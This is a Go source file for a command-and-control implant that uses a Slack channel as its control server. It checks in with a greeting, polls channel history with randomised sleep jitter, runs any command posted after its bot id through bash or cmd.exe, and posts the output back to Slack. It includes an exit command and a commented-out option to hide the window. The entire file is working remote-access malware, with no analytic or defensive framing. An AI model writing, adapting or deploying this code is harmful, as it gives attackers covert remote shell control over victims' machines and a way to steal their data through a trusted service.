package main

import (
    "fmt"
    "math/rand"
    "os"
    "os/exec"
    "runtime"
    "strings"
    "time"

    "github.com/nlopes/slack"
)

const (
    SleepDuration = 60
)

var (
    CHANID      string
    SLACKTOKEN  string
    UUID        string
)

func handleSleep(sleep int) {
    rand.Seed(time.Now().UnixNano())
    min := 1
    max := 5
    num := rand.Intn(max - min) + min
    sleepWithJitter := sleep * num
    time.Sleep(time.Duration(sleepWithJitter) * time.Second)
}

func runCmd(cmd string) string {
    shell := "bash"
    shell_arg := "-c"

    if runtime.GOOS == "windows" {
        shell = "cmd.exe"
        shell_arg = "/C"
    }

    myCmd := exec.Command(shell, shell_arg, cmd)
    //myCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    cmdOut, err := myCmd.Output()
    if err != nil {
        return "Error with cmd: " + err.Error() + " " + cmd
    } else {
        return string(cmdOut)
    }
}

func postMsg(api *slack.Client, chan_id string, msg string) {
    channelID, timestamp, err := api.PostMessage(chan_id, slack.MsgOptionText(msg, false))
    if err != nil {
        fmt.Printf("%s\n", err)
        return
    }
    fmt.Printf("Message successfully sent to channel %s at %s\n", channelID, timestamp)
}

func main() {
    bot_id := UUID
    channel_id := CHANID
    slack_token := SLACKTOKEN
    api := slack.New(slack_token)

    hello := "Hello, " + bot_id + " reporting for duty."
    postMsg(api,channel_id,hello)

    last := ""
    for true {
        handleSleep(SleepDuration)
        historyParams := slack.HistoryParameters{Latest: "", Oldest: "0", Count: 2, Inclusive: false, Unreads:false,}
        history, err := api.GetChannelHistory(channel_id, historyParams)
        if err != nil {
            fmt.Printf("%s\n", err)
            return
        }
        for _,data := range history.Messages {
            if strings.Contains(data.Text, bot_id + " exit") {
                os.Exit(0)
            } else if strings.Contains(data.Text, bot_id + " run ") {
                if strings.Compare(last,data.Text) != 0  {
                    cmd := strings.Replace(data.Text, bot_id + " run ","", -1)
                    output := runCmd(cmd)
                    fmt.Println("cmd: \n" + cmd)
                    fmt.Println("output: \n" + output)
                    postMsg(api, channel_id, output)
                    last = data.Text
                }
            }
        }
    }
}
